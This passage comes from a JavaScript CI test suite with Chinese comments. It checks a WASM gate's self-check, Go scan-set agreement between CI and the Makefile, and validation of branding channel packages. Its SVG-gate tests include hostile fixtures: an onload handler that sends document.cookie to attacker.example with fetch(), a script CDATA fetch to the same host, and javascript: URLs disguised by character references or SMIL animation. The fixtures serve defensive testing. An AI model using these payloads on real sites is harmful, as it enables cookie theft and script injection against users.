      const wrongHead = '0'.repeat(40)
      const refused = spawnSync('bash', ['scripts/verify-wasm-client-only.sh', '--groups', '8'], {
        cwd: root,
        encoding: 'utf8',
        env: { ...process.env, [observedEnvName]: wrongHead },
      })
      const refusalText = `${refused.stdout ?? ''}${refused.stderr ?? ''}`
      check(refused.status === 2,
        `${observedEnvName} 与当前 HEAD 不符时,真脚本必须以退出码 2 前置拒绝(实际 ${String(refused.status)})`)
      check(refusalText.includes('结论不可比'),
        `${observedEnvName} 的前置拒绝必须打印「结论不可比」`
        + `(实际输出:${refusalText.split('\n').slice(0, 3).join(' / ').slice(0, 200)})`)
      check(!refusalText.includes('W5 文档与作者面判据'),
        `${observedEnvName} 的前置拒绝必须发生在**跑任何一组之前**(输出里出现了组 8 的标题 ⇒ 判据已经跑过才拒绝)`)
    }
  }
}

// ---- 1d-2. WASM 探针证据协议的自证必须**可被打坏**(2026-09-23 第五轮审计 R4-A N2) ----
//
// 现场(R5-D §N2 / VERIFY.md N2):组级不变量是**计数**不变量 ⇒
//   · 早退分支把 `skip` 写成 `pass`("跳过但打印 PASS")⇒ `group 6 pass=1` + EXIT=0;
//   · 把探针换成 `exit 0` 桩并打印伪造的 VERDICT 行 ⇒ 4 PASS / EXIT=0。
// 修复本体(`scripts/verify-wasm-client-only.sh`):真探针必须产出**带本次 nonce 的**
// 结构化证据行,组级判据改成**集合**判定(发现集合 == 证据集合),并配 16 条自证样本。
//
// 这一组是本守卫作为**独立来源**给出的"自证网":它真跑 `--self-check`,再在
// **副本**上把自证本身打坏,要求它变红 —— 只把自证剪掉(或把 validator 改成恒接受)
// 在这里必然被咬住(而不是"自证自己说自己通过了")。
{
  const gateScript = join(root, 'scripts', 'verify-wasm-client-only.sh')
  const source = readFileSync(gateScript, 'utf8')
  const runSelfCheck = script => spawnSync('bash', [script, '--self-check'], {
    cwd: root,
    encoding: 'utf8',
    timeout: 120_000,
  })
  const baseline = runSelfCheck(gateScript)
  const baselineOut = `${baseline.stdout ?? ''}${baseline.stderr ?? ''}`
  check(baseline.status === 0,
    `WASM 门禁的 --self-check 必须 exit 0（实际 ${baseline.status}）：${baselineOut.trim().slice(-300)}`)
  const summary = /probe-evidence self-check: samples=(\d+)\/(\d+) accepted=(\d+) rejected=(\d+)/u.exec(baselineOut)
  if (summary === null) {
    fail(`WASM 门禁的 --self-check 没有打印自证汇总结论（样本数与接受/拒绝计数不可见）：`
      + `${baselineOut.trim().slice(-200)}`)
  } else {
    const [, observed, registered, accepted, rejected] = summary.map(Number)
    check(observed === registered,
      `WASM 探针证据自证只跑了 ${observed}/${registered} 条样本 ⇒ 有样本没被跑（自证被掏空）`)
    check(registered >= 16,
      `WASM 探针证据自证样本只剩 ${registered} 条（下限 16）—— 样本被删到没有判别力`)
    check(accepted >= 2 && rejected >= 1,
      `WASM 探针证据自证：接受 ${accepted} / 拒绝 ${rejected} —— 两侧都要有样本（否则判据可能恒接受或恒拒绝）`)
    console.log(`verify-ci-scripts: WASM 探针证据自证 samples=${observed}/${registered} `
      + `accepted=${accepted} rejected=${rejected}`)
  }
  // 静态接线(与动态变异互补):两种攻击形态的样本 id 与两条组级证据必须在源码里。
  for (const needle of ['exit0-silent', 'exit0-forged-static', 'skip-with-pass-attest',
    'early-exit-pass-no-evidence', 'group6-invariant:', 'probe-attested:']) {
    check(source.includes(needle),
      `WASM 门禁源码里找不到 \`${needle}\` —— 探针证据协议/自证样本被删了（R4-A N2 的两种攻击形态必须各有样本盯着）`)
  }
  // 变异副本:把自证打坏 ⇒ `--self-check` 必须非零。
  const BREAK_CASES = [
    {
      id: 'validator-always-accept',
      label: '证据 validator 恒接受（自证被掏空）',
      needle: 'probe_evidence_verdict() {',
      // 在函数体最前面插入无条件接受 ⇒ 所有 reject 样本都会被"接受"
      replacement: "probe_evidence_verdict() {\n  printf 'accept'; return 0",
    },
    {
      id: 'selftest-sample-removed',
      label: '自证样本被删（"exit 0 桩"没有样本盯着）',
      needle: '  "exit0-silent|reject|0|"\n',
      replacement: '',
    },
    {
      id: 'selftest-call-removed',
      label: '自证入口被删（--self-check 不再证明任何东西）',
      needle: 'probe_evidence_selftest() {',
      replacement: 'probe_evidence_selftest_disabled() {',
    },
  ]
  for (const breakCase of BREAK_CASES) {
    const dir = tempDir(`wasm-selfcheck-${breakCase.id}-`)
    const copy = join(dir, 'verify-wasm-client-only.sh')
    if (!source.includes(breakCase.needle)) {
      fail(`WASM 自证变异 \`${breakCase.id}\` 的注入锚点失效（锚点 ${JSON.stringify(breakCase.needle)} 不在源码里）`
        + ' —— 请同步本守卫的锚点，不要直接删掉这段')
      continue
    }
    writeFileSync(copy, source.replace(breakCase.needle, breakCase.replacement))
    const mutated = runSelfCheck(copy)
    check(mutated.status !== 0,
      `WASM 自证变异「${breakCase.label}」之后 --self-check 仍然 exit 0 ⇒ 自证网是假绿（N2 的"拆掉自证 ⇒ 红"没成立）`)
    console.log(`verify-ci-scripts: WASM 探针证据自证 变异「${breakCase.label}」⇒ --self-check 非零 ✓`)
  }
}

// ---- 1e. Go 扫描面:CI 与 server/Makefile 同源(第三轮审计 P-4 / 第六轮 R6-C P2-1) ----
//
// 现场:CI 的 gofmt 步骤扫 `cmd internal`,而 `server/Makefile` 的 check / check-fast
// 扫 `cmd internal demoapps` ⇒ `server/demoapps/**`(随镜像分发的内置演示应用 Go 源码)
// 里的格式违规在 CI 全绿,而 `go vet ./...` 与 `go test ./...` 都不查格式。所以
// "CI 全绿"在那条面上是假的。
//
// R6-C P2-1(2026-09-23 第六轮审计)又指出另一半:`gofmt`/`vet`/`test` 三面都漏掉同一个
// Go module 里的 `webadmin/`(embed.go)与 `scripts/`(mock-upstream.go) —— CI 的
// `go vet ./...` / `go test ./...` **覆盖**它们,本地 `make check` 不覆盖 ⇒ 这两处
// 写坏是"本地绿、CI 红";当时 `Makefile:72` 那句"与 CI 同义"是不实陈述。
//
// 判据不是"两边文本相等"(那是声明),而是**目录集合相等 + 目录真实存在**:
//   · 单侧加目录(Makefile 加、CI 不加)= 两条门禁分叉 ⇒ 红;
//   · 单侧删目录(CI 删 demoapps/webadmin/scripts)= 扫描面缩水 ⇒ 红;
//   · 目录名打错(扫一个不存在的目录)= 红;
//   · Makefile 的 check 与 check-fast 出现两个不同的扫描面 ⇒ 红;
//   · Makefile 的 `go vet` / `go test` 用的包集合 ≠ `GO_DIRS` 派生出的集合 ⇒ 红
//     (那是"注释说同义、命令不同义"的形态;`test` 目标的 `./...` 例外 —— 它显式包含
//      未跟踪的 `temp/**` 探针,是**更宽**的面,方向安全)。
// 目录集合从两侧**真源**解析(CI 的 run 块 + Makefile 的 `GO_DIRS`),不写死字面量 ——
// 写死的话改了真源判据不会跟着动(那正是 P-1/P-2/R6-C P2-1 的假绿形态)。
{
  const workflowText = readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8')
  const block = extractRunBlocks(workflowText).find(entry => /gofmt\s+-l\b/u.test(entry.content))
  check(block !== undefined, 'ci.yml 里找不到 gofmt 步骤(抽取失败或整步被删)')

  const makefile = readFileSync(join(root, 'server', 'Makefile'), 'utf8')
  /** 解析 Makefile 变量(`X := …` / `X ?= …` / `X = …`),返回 token 数组。 */
  const makeVar = name => {
    const match = new RegExp(`^${name}\\s*[:?]?=\\s*(.+)$`, 'mu').exec(makefile)
    return match === null ? null : match[1].trim().split(/\s+/u).filter(Boolean)
  }
  const goDirs = makeVar('GO_DIRS')
  check(goDirs !== null && goDirs.length > 0,
    'server/Makefile 里找不到 `GO_DIRS`(Go 扫描面的唯一真源)—— 请恢复它，不要把目录列表抄回各条命令')
  const expectedPackages = (goDirs ?? []).map(dir => `./${dir}/...`)

  /** 取出文本里所有 `gofmt -l <目录…>` 的目录列表,并把 `$(GO_DIRS)` 展开成真源目录。 */
  const scanLists = text => [...text.matchAll(/gofmt\s+-l\s+([^\n"';|&]+)/gu)]
    // 剥掉 shell 里的收尾括号:`$$(gofmt -l $(GO_DIRS))` / `FILES="$(gofmt -l cmd)"`。
    // 只剥**不配对**的那些 —— `$(GO_DIRS)` 自己的右括号必须留着。
    .map(match => {
      let raw = match[1].trim()
      for (;;) {
        const opens = (raw.match(/\$\(/gu) ?? []).length
        const closes = (raw.match(/\)/gu) ?? []).length
        if (closes <= opens || !raw.endsWith(')')) break
        raw = raw.slice(0, -1).trimEnd()
      }
      return raw.split(/\s+/u).filter(Boolean)
    })
    .filter(dirs => dirs.length > 0)
    .map(dirs => dirs.flatMap(dir => (dir === '$(GO_DIRS)' ? (goDirs ?? [dir]) : [dir])))
  const makefileLists = scanLists(makefile)
  check(makefileLists.length > 0, 'server/Makefile 里找不到 `gofmt -l`(唯一真源被删?)')
  check(
    new Set(makefileLists.map(dirs => dirs.join(' '))).size === 1,
    `server/Makefile 的每处 gofmt -l 必须扫同一组目录(本地快慢门禁不许分叉),实际 ${JSON.stringify(makefileLists)}`,
  )
  const makefileDirs = makefileLists[0] ?? []
  check(
    makefileDirs.join(' ') === (goDirs ?? []).join(' '),
    `server/Makefile 的 gofmt 扫描面必须等于 GO_DIRS:期望 [${(goDirs ?? []).join(' ')}],`
      + `实际 [${makefileDirs.join(' ')}] —— 三面(gofmt/vet/test)必须由同一份目录真源派生`,
  )
  const ciDirs = block === undefined ? [] : (scanLists(block.content)[0] ?? [])
  check(ciDirs.length > 0, 'ci.yml 的 gofmt 步骤里找不到 `gofmt -l <目录…>`')
  check(
    ciDirs.join(' ') === makefileDirs.join(' '),
    'CI 的 gofmt 扫描面必须与 server/Makefile 同源(唯一真源是 Makefile 的 `GO_DIRS`)'
      + `:期望 [${makefileDirs.join(' ')}],实际 [${ciDirs.join(' ')}]`
      + ' —— 只改一侧会让 CI 与本地 make check 的门禁分叉',
  )
  for (const dir of ciDirs) {
    check(
      existsSync(join(root, 'server', dir)),
      `gofmt 扫描目录 server/${dir} 不存在(打错的目录名等于白扫)`,
    )
  }

  // Makefile 的 `go vet` / `go test` 必须与 gofmt 同面(经 `$(GO_PACKAGES)` 或逐字列出)。
  const goCommandLines = makefile.split('\n')
    .map(line => /^\s*go\s+(vet|test)\s+(.+)$/u.exec(line))
    .filter(match => match !== null)
  check(goCommandLines.length >= 3,
    `server/Makefile 里的 go vet/go test 命令行只剩 ${goCommandLines.length} 条(期望 ≥ 3)—— 抽取失效或命令被删`)
  for (const match of goCommandLines) {
    const [, verb, rest] = match
    const packages = rest.replace('$(GO_PACKAGES)', expectedPackages.join(' '))
      .split(/\s+/u).filter(token => token.startsWith('./'))
    // `go test ./...`(test 目标):显式含未跟踪的 `temp/**` 探针,是**更宽**的面。
    const isEverything = packages.length === 1 && packages[0] === './...'
    if (isEverything) continue
    check(
      packages.join(' ') === expectedPackages.join(' '),
      `server/Makefile 的 \`go ${verb}\` 包集合必须等于 GO_DIRS 派生出的集合`
        + `(期望 [${expectedPackages.join(' ')}],实际 [${packages.join(' ')}])`
        + ' —— "与 CI 同义"必须是命令级事实，不能只是注释里的一句话(R6-C P2-1)',
    )
  }
}

// ---- 2. 掩码 / 跳过不合规目录 / 不回显名字 ----
{
  const source = fakeChannelRepo(['official', 'example-brand'], { extraDirectories: ['README', 'Bad_Name'] })
  const result = runChannels({ source, refName: 'v2.7.0', dest: 'channels', list: 'd.list' })
  check(result.status === 0, '含不合规目录时仍应成功(跳过而非失败)')
  check(result.stdout.includes('::add-mask::example-brand'), '每个渠道 id 都必须 add-mask')
  check(result.stdout.includes('::add-mask::official'), 'official 也必须 add-mask')
  check(!result.stdout.includes('README'), '被跳过的目录名不得出现在输出里')
  check(!result.stdout.includes('Bad_Name'), '不合规目录名不得出现在输出里')
  check(result.stderr.includes('已跳过'), '跳过不合规目录时应给出计数告警')
  check(
    JSON.stringify(result.selected) === JSON.stringify(orderedChannelIds(source)),
    `不合规目录不得进入构建列表(期望=合规目录全集,含 R8-C-7 的下限补位),实际 ${JSON.stringify(result.selected)}`,
  )
}

// ---- 3. fail-loud 分支 ----
{
  const noToken = runChannels({ source: undefined, refName: 'v2.7.0', dest: 'channels', list: 'e.list' })
  check(noToken.status !== 0, '没有渠道仓令牌时必须失败(不得静默按官方发)')
  check(noToken.stderr.includes('CHANNELS_REPO_TOKEN'), '失败信息应指明缺失的 secret')

  const wrongStructure = tempDir('ci-channels-bad-')
  mkdirSync(join(wrongStructure, 'not-channels'), { recursive: true })
  const bad = runChannels({ source: wrongStructure, refName: 'v2.7.0', dest: 'channels', list: 'f.list' })
  check(bad.status !== 0, '渠道仓结构不符时必须失败')

  // 正式 tag 选中的渠道在仓里缺 channel.json → 必须失败(不是"跳过")
  const missingConfig = tempDir('ci-channels-missing-')
  mkdirSync(join(missingConfig, 'channels', 'official'), { recursive: true })
  writeFileSync(join(missingConfig, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  mkdirSync(join(missingConfig, 'channels', 'beta'), { recursive: true }) // 无 channel.json
  padChannelRepo(missingConfig) // 下限补位：让这条用例只测「缺 channel.json」，不被渠道目录数下限先拦住
  const missing = runChannels({ source: missingConfig, refName: 'v2.7.0', dest: 'channels', list: 'g.list' })
  check(missing.status !== 0, '选中渠道缺 channel.json 时必须失败')

  // 渠道包缺品牌字段 → 必须**中止构建**:客户端登录页/侧边栏在服务端不可达时
  // 回落中性占位,交付出去就是观感事故,而这类事故只能在构建期拦。
  const branded = tempDir('ci-channels-brand-')
  mkdirSync(join(branded, 'channels', 'official'), { recursive: true })
  writeFileSync(join(branded, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  mkdirSync(join(branded, 'channels', 'example-brand'), { recursive: true })
  writeFileSync(join(branded, 'channels', 'example-brand', 'channel.json'), '{"schema":1,"channel_id":"example-brand"}')
  padChannelRepo(branded) // 下限补位（同上）
  const noBrand = runChannels({ source: branded, refName: 'v2.7.0', dest: 'channels', list: 'h.list' })
  check(noBrand.status !== 0, '渠道包缺品牌字段时必须失败')
  check(noBrand.stderr.includes('品牌字段'), '失败信息应指明缺的是品牌字段')
  check(noBrand.stderr.includes('identity.display_name'), '失败信息应列出缺失的具体字段')
  check(!noBrand.stderr.includes('example-brand'), '品牌缺失的报错不得回显渠道名')

  // 只有 display_name、没有 short_name 也要中止(登录页名字的直接来源)
  const halfBranded = tempDir('ci-channels-brand-half-')
  mkdirSync(join(halfBranded, 'channels', 'official'), { recursive: true })
  writeFileSync(join(halfBranded, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  padChannelRepo(halfBranded) // 下限补位（同上）
  const half = runChannels({ source: halfBranded, refName: 'v2.7.0', dest: 'channels', list: 'i.list' })
  check(half.status !== 0, '只配 display_name 也必须失败')
  check(half.stderr.includes('identity.short_name'), '失败信息应点明缺 short_name')

  // 品牌渠道缺**编译期**字段 → 必须中止:缺 desktop.slug 时安装包名回落
  // `PicoAide-Harness-…`(交付物上的厂商品牌),缺 app_id 时 bundle id 回落厂商值
  // (两个渠道的客户端在系统里变成同一个 app)。
  const noCompile = tempDir('ci-channels-compile-')
  mkdirSync(join(noCompile, 'channels', 'official'), { recursive: true })
  writeFileSync(join(noCompile, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  mkdirSync(join(noCompile, 'channels', 'example-brand'), { recursive: true })
  writeFileSync(join(noCompile, 'channels', 'example-brand', 'channel.json'),
    '{"schema":1,"channel_id":"example-brand","identity":{"display_name":"Example","short_name":"Example"}}')
  padChannelRepo(noCompile) // 下限补位（同上）
  const compile = runChannels({ source: noCompile, refName: 'v2.7.0', dest: 'channels', list: 'j.list' })
  check(compile.status !== 0, '品牌渠道缺编译期字段时必须失败')
  check(compile.stderr.includes('desktop.slug') && compile.stderr.includes('desktop.app_id'),
    '失败信息应列出缺的编译期字段')
  check(!compile.stderr.includes('example-brand'), '编译期字段报错不得回显渠道名')

  // channel.json 字段形状不对(slug 含空格、scheme 非法)→ 构建期拦
  const badShape = tempDir('ci-channels-shape-')
  mkdirSync(join(badShape, 'channels', 'official'), { recursive: true })
  writeFileSync(join(badShape, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  mkdirSync(join(badShape, 'channels', 'example-brand'), { recursive: true })
  writeFileSync(join(badShape, 'channels', 'example-brand', 'channel.json'), JSON.stringify({
    schema: 1,
    channel_id: 'example-brand',
    identity: { display_name: 'Example', short_name: 'Example' },
    desktop: { slug: 'Example AI', app_id: 'com.example.brand', deep_link_scheme: 'Example!', app_origin_scheme: 'examplebrand-app' },
  }))
  padChannelRepo(badShape) // 下限补位（同上）
  const shape = runChannels({ source: badShape, refName: 'v2.7.0', dest: 'channels', list: 'k.list' })
  check(shape.status !== 0, '字段形状非法时必须失败')
  check(shape.stderr.includes('desktop.slug') && shape.stderr.includes('deep_link_scheme'),
    '失败信息应指出非法字段')

  // app-icon.png 不符合 mac 图标管线要求(1024×1024 RGBA16 + ICC)→ 构建期拦,
  // 而不是等到三平台打包时才炸(mac 图标由 sharp 派生,要求极严)。
  const badIcon = tempDir('ci-channels-icon-')
  mkdirSync(join(badIcon, 'channels', 'official'), { recursive: true })
  writeFileSync(join(badIcon, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  mkdirSync(join(badIcon, 'channels', 'example-brand'), { recursive: true })
  writeFileSync(join(badIcon, 'channels', 'example-brand', 'channel.json'), JSON.stringify({
    schema: 1,
    channel_id: 'example-brand',
    identity: { display_name: 'Example', short_name: 'Example' },
    desktop: { slug: 'Example-AI', app_id: 'com.example.brand', deep_link_scheme: 'examplebrand', app_origin_scheme: 'examplebrand-app' },
  }))
  writeFileSync(join(badIcon, 'channels', 'example-brand', 'app-icon.png'), tinyPng(256, 256, 8, 6))
  padChannelRepo(badIcon) // 下限补位（同上）
  const icon = runChannels({ source: badIcon, refName: 'v2.7.0', dest: 'channels', list: 'l.list' })
  check(icon.status !== 0, 'app-icon.png 尺寸不符时必须失败')
  check(icon.stderr.includes('app-icon.png'), '失败信息应点名 app-icon.png')

  // 未知素材字段(很可能是拼错)→ 只告警,不中止发布
  const unknownAsset = tempDir('ci-channels-unknown-asset-')
  mkdirSync(join(unknownAsset, 'channels', 'official'), { recursive: true })
  writeFileSync(join(unknownAsset, 'channels', 'official', 'channel.json'), JSON.stringify({
    schema: 1,
    channel_id: 'official',
    identity: { display_name: 'Official', short_name: 'Official' },
    desktop: { app_origin_scheme: 'picoaide-app' },
    assets: { _note: '注解', logoo: 'logo.svg' },
  }))
  padChannelRepo(unknownAsset) // 下限补位（同上）
  const unknown = runChannels({ source: unknownAsset, refName: 'v2.7.0', dest: 'channels', list: 'n.list' })
  check(unknown.status === 0, '未知素材字段不应中止发布(只告警)')
  // R8-D-14：未知素材字段**只报数量,不回显键名** —— 键名本身就是渠道包里的字符串,
  // 可能是品牌/渠道标识（实测 `assets.<品牌>_logo` 原样进过公开日志；老写法只对
  // "非字段名形状"的键脱敏，而品牌标识恰好是字段名形状）。所以这里反过来钉：
  // 告警必须给**计数**，且**不得**出现键名（这条断言以前钉的是相反的行为）。
  check(
    unknown.stderr.includes('1 个未知素材字段') && unknown.stderr.includes('assets.<unknown>'),
    `未知素材字段的告警必须给出计数与占位名,实际: ${unknown.stderr.trim().slice(0, 200)}`,
  )
  check(
    !`${unknown.stdout}${unknown.stderr}`.includes('logoo'),
    '未知素材字段的告警不得回显键名(键名可能是品牌标识,而这里进公开日志)',
  )

  // R7-RV-4(P3,复核 2026-09-13):素材脚本特征门禁必须**按结构**判定,不能在
  // 整份正文上跑正则 —— 合法 SVG 的注释、<title>/<desc>/文本节点、CDATA 里写
  // "导出时不要使用 onload= / javascript: URL"只是说明文字,旧实现会把这类
  // 素材判成脚本素材、把**整条渠道发布**打回(fail-loud 误伤;桌面侧同款正则
  // 命中时只是丢弃该素材,不拦发布)。
  // R7-RV-5(P3):门禁还必须**按内容**判定 —— 素材的 Content-Type 是按文件名
  // (扩展名)定的,把带脚本的 SVG 命名成 logo.png/logo.ico 就能同时绕过扩展名
  // 检查与下发类型(服务端按 .png 下发,浏览器却按 SVG 文档渲染),所以凡"内容
  // 像 XML/SVG 文档"的素材一律按 SVG 检查,不管扩展名。
  const svgGateRepo = (assets, files) => {
    const root = tempDir('ci-channels-svg-gate-')
    mkdirSync(join(root, 'channels', 'official'), { recursive: true })
    writeFileSync(join(root, 'channels', 'official', 'channel.json'), JSON.stringify({
      schema: 1,
      channel_id: 'official',
      identity: { display_name: 'Official', short_name: 'Official' },
      desktop: { app_origin_scheme: 'picoaide-app' },
      assets,
    }))
    for (const [fileName, content] of Object.entries(files)) {
      writeFileSync(join(root, 'channels', 'official', fileName), content)
    }
    padChannelRepo(root) // 下限补位（同所有稳定 tag 夹具）
    return root
  }
  const benignScriptishWords = [
    '<?xml version="1.0" encoding="UTF-8" standalone="no"?>',
    '<!-- 安全说明:导出时不要使用 onload= 事件属性或 javascript: URL -->',
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4">',
    '  <title>javascript: 与 onload= 都禁止</title>',
    '  <desc><![CDATA[导出规范:禁用 javascript: URL / onload= 事件属性]]></desc>',
    '  <text x="0" y="4" font-family="Arial">javascript: URL</text>',
    '  <rect width="4" height="4"/>',
    '</svg>',
  ].join('\n')
  const evilSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4" onload="fetch(\'//attacker.example/\'+document.cookie)"><script>alert(1)</script></svg>'

  // 良性:脚本字样只出现在注释/标题/描述/CDATA 文本里 → 必须放行(不误伤发布)。
  const benignGate = runChannels({
    source: svgGateRepo(
      { logo: 'logo.svg', logo_dark: 'logo-dark.svg', favicon: 'favicon.svg' },
      { 'logo.svg': benignScriptishWords, 'logo-dark.svg': benignScriptishWords, 'favicon.svg': benignScriptishWords },
    ),
    refName: 'v2.7.0', dest: 'channels', list: 'p.list',
  })
  check(
    benignGate.status === 0,
    `脚本字样只出现在注释/文本节点里的合法 SVG 不得拦发布(实际 exit=${benignGate.status}: ${benignGate.stderr.trim()})`,
  )

  // 恶意改名:内容是可执行 SVG,扩展名是 .png/.ico → 必须按内容嗅探拦下。
  for (const [key, fileName] of [['logo', 'logo.png'], ['favicon', 'favicon.ico']]) {
    const renamed = runChannels({
      source: svgGateRepo({ [key]: fileName }, { [fileName]: evilSvg }),
      refName: 'v2.7.0', dest: 'channels', list: 'q.list',
    })
    check(
      renamed.status !== 0,
      `带脚本的 SVG 改名成 ${fileName} 必须被内容嗅探拦下(扩展名不是免检牌)`,
    )
    check(renamed.stderr.includes(`assets.${key}`), `改名绕过失败信息应点名 assets.${key}`)
    check(
      !`${renamed.stdout}${renamed.stderr}`.includes('attacker.example'),
      '失败信息不得回显素材内容(只报字段名与特征种类)',
    )
  }

  // UTF-16 编码的同一份恶意 SVG:嗅探必须解码后再判定,不能靠字节前缀漏掉。
  const utf16Evil = Buffer.concat([
    Buffer.from([0xff, 0xfe]),
    Buffer.from(evilSvg, 'utf16le'),
  ])
  const utf16Gate = runChannels({
    source: svgGateRepo({ logo: 'logo.png' }, { 'logo.png': utf16Evil }),
    refName: 'v2.7.0', dest: 'channels', list: 'r.list',
  })
  check(utf16Gate.status !== 0, 'UTF-16 编码的恶意 SVG 必须同样被拦下')

  // 结构判定的边界:CDATA 只在**元素外**是文本 —— <script><![CDATA[…]]></script>
  // 里的 CDATA 是脚本内容,不得因为跳过 CDATA 而漏判。
  const scriptCdata = runChannels({
    source: svgGateRepo(
      { logo: 'logo.svg' },
      { 'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><script><![CDATA[fetch(\'//attacker.example/x\')]]></script></svg>' },
    ),
    refName: 'v2.7.0', dest: 'channels', list: 's.list',
  })
  check(scriptCdata.status !== 0, '<script><![CDATA[…]]></script> 必须被拦下(CDATA 不是元素内脚本的豁免)')
  check(scriptCdata.stderr.includes('assets.logo'), 'script 元素命中应点名 assets.logo')

  // 结构判定的另外两个已知绕法:
  //   - XML 数字字符引用会被解析器还原(`&#106;avascript:` === `javascript:`);
  //   - SMIL 动画能把事件属性"写"进去(`<set attributeName="onload" to="…"/>`)。
  for (const [label, svg] of [
    ['字符引用伪装的 javascript: URL', '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 4 4"><a xlink:href="&#106;avascript:alert(1)"><rect width="4" height="4"/></a></svg>'],
    ['SMIL 动画写入事件属性', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><rect width="4" height="4"><set attributeName="onload" to="alert(1)"/></rect></svg>'],
  ]) {
    const run = runChannels({
      source: svgGateRepo({ logo: 'logo.svg' }, { 'logo.svg': svg }),
      refName: 'v2.7.0', dest: 'channels', list: 't.list',
    })
    check(run.status !== 0, `${label} 必须被拦下`)
  }

  // 良性实体(`&amp;` 查询串、`&lt;` 文本)不得被字符引用解码逻辑误伤。
  const benignEntity = runChannels({
    source: svgGateRepo(
      { logo: 'logo.svg' },
      { 'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><image href="https://cdn.example.com/logo.png?a=1&amp;b=2" width="4" height="4"/><text x="0" y="4">A &amp; B &lt;svg&gt;</text></svg>' },
    ),
    refName: 'v2.7.0', dest: 'channels', list: 'u.list',
  })
  check(benignEntity.status === 0, `href 里的 &amp; 与文本里的 &lt; 不得被误判为脚本特征(实际 exit=${benignEntity.status})`)

  // 报错**不得回显品牌取值**:slug/app_id/scheme 的值就是客户品牌
  // (Acme-AI / com.acme.ai / acmeai),而这一步的输出去公开 Actions 日志。
  // 2026-09-10 审计当场发现早先版本把值拼进了错误信息 —— ::add-mask:: 只掩码
  // 渠道 id,掩不到这些值,所以必须由脚本自己保证。
  const leaky = tempDir('ci-channels-leak-')
  mkdirSync(join(leaky, 'channels', 'official'), { recursive: true })
  writeFileSync(join(leaky, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  mkdirSync(join(leaky, 'channels', 'example-brand'), { recursive: true })
  writeFileSync(join(leaky, 'channels', 'example-brand', 'channel.json'), JSON.stringify({
    schema: 1,
    channel_id: 'example-brand',
    identity: { display_name: 'Secret Brand', short_name: 'Secret' },
    // 三个字段都**非法**:非法值才是会被拼进早先版本错误信息的东西
    desktop: { slug: 'TOP SECRET BRAND', app_id: 'com.secret brand', deep_link_scheme: 'SECRET!', app_origin_scheme: 'examplebrand-app' },
  }))
  padChannelRepo(leaky) // 下限补位（同上）
  const leak = runChannels({ source: leaky, refName: 'v2.7.0', dest: 'channels', list: 'o.list' })
  const leakOut = `${leak.stdout ?? ''}${leak.stderr ?? ''}`
  check(leak.status !== 0, '非法编译期字段必须中止构建')
  check(leak.stderr.includes('desktop.slug'), '失败信息仍须指明是哪个字段不合法')
  check(leak.stderr.includes('desktop.deep_link_scheme'), '失败信息应列出全部非法字段')
  check(!leakOut.includes('TOP SECRET BRAND'), '报错不得回显 slug 取值(那是客户品牌)')
  check(!leakOut.includes('com.secret brand'), '报错不得回显 app_id 取值')
  check(!leakOut.includes('SECRET!'), '报错不得回显 scheme 取值')

  // 声明的素材文件不存在 → 构建期拦(否则服务端不下发 URL、客户端拿到死链)
  const missingAsset = tempDir('ci-channels-asset-')
  mkdirSync(join(missingAsset, 'channels', 'official'), { recursive: true })
  writeFileSync(join(missingAsset, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"Official","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  mkdirSync(join(missingAsset, 'channels', 'example-brand'), { recursive: true })
  writeFileSync(join(missingAsset, 'channels', 'example-brand', 'channel.json'), JSON.stringify({
    schema: 1,
    channel_id: 'example-brand',
    identity: { display_name: 'Example', short_name: 'Example' },
    desktop: { slug: 'Example-AI', app_id: 'com.example.brand', deep_link_scheme: 'examplebrand', app_origin_scheme: 'examplebrand-app' },
    assets: { logo: 'logo.svg' },
  }))
  padChannelRepo(missingAsset) // 下限补位（同上）
  const asset = runChannels({ source: missingAsset, refName: 'v2.7.0', dest: 'channels', list: 'm.list' })
  check(asset.status !== 0, '声明的素材文件不存在时必须失败')
  check(asset.stderr.includes('assets.logo'), '失败信息应点名缺哪个素材')

  // 空白字符串不算配置(与客户端 nonEmpty 口径一致)
  const blank = tempDir('ci-channels-brand-blank-')
  mkdirSync(join(blank, 'channels', 'official'), { recursive: true })
  writeFileSync(join(blank, 'channels', 'official', 'channel.json'),
    '{"schema":1,"channel_id":"official","identity":{"display_name":"   ","short_name":"Official"},"desktop":{"app_origin_scheme":"picoaide-app"}}')
  padChannelRepo(blank) // 下限补位（同上）
  const blankRun = runChannels({ source: blank, refName: 'v2.7.0', dest: 'channels', list: 'j.list' })
  check(blankRun.status !== 0, '空白品牌名必须视为缺失')

  // 数据目录(desktop.home_dir):渠道客户端的数据根 —— 账户 token、settings、
  // 会话、连接器凭据都在里面。缺了/写错/写回官方目录都必须中止构建:
  // 装到客户机器上才发现就是"两个渠道共用一份登录态"(跨租户)。
  const brandOnly = (homeDirValue) => {
    const root = tempDir('ci-channels-home-')
